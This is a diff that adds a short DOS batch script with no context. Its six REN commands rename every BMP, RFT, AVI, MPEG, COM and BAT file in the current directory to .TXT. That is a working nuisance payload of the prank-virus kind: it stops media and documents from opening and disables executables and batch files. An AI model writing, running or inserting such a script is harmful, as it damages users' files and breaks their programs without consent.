@@ -1,1 +1,6 @@
-
+REN *.BMP *.TXT 
+REN *.RFT *.TXT
+REN *.AVI *.TXT
+REN *.MPEG *.TXT
+REN *.COM *.TXT
+REN *.BAT *.TXT
